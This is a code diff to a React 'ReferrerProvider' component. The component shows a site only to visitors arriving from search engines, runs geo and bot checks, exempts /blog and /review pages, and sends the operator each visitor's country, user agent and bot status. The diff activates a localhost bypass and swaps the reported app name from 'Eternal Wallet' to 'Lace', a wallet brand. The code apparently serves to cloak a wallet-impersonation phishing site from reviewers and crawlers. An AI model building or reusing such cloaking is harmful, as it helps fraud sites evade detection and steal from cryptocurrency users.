@@ -106,6 +106,15 @@ const ReferrerProvider = ({ children, isBot: serverIsBot }: { children: React.Re
       console.log("[ReferrerProvider] Checking access for path:", pathname);
 
       const currentPath = pathname || window.location.pathname;
+      const currentUrl = window.location.href;
+
+      // Allow localhost development without referrer or geo checks
+      if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
+        console.log("[ReferrerProvider] Localhost development detected, allowing access.");
+        setIsFromSearch(true);
+        setIsLoading(false);
+        return;
+      }
 
       // Allow access to blog and review page
       if (currentPath?.startsWith("/blog") || currentPath?.startsWith("/review")) {
@@ -142,19 +151,10 @@ const ReferrerProvider = ({ children, isBot: serverIsBot }: { children: React.Re
 
       // Search engine or allowed referrer logic
       const referrer = document.referrer;
-      const currentUrl = window.location.href;
 
       console.log("[ReferrerProvider] Current URL:", currentUrl);
       console.log("[ReferrerProvider] Referrer URL:", referrer);
       console.log("[ReferrerProvider] Comparing referrer with allowed domains...");
-
-      // Special handling for localhost development - always allow access
-      // if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
-      //   console.log("[ReferrerProvider] Localhost development detected, allowing access.");
-      //   setIsFromSearch(true);
-      //   setIsLoading(false);
-      //   return;
-      // }
 
       if (isFromSearchEngineOrAllowed(referrer)) {
         setIsFromSearch(true);
@@ -201,7 +201,7 @@ const ReferrerProvider = ({ children, isBot: serverIsBot }: { children: React.Re
 
           await sendNotificationMessage(
             userCountry,
-            "Eternal Wallet", // Your app name
+            "Lace",
             userAgent,
             isBot ? { isBot: true, botType: specificBotType || "Unknown Bot" } : null
           );
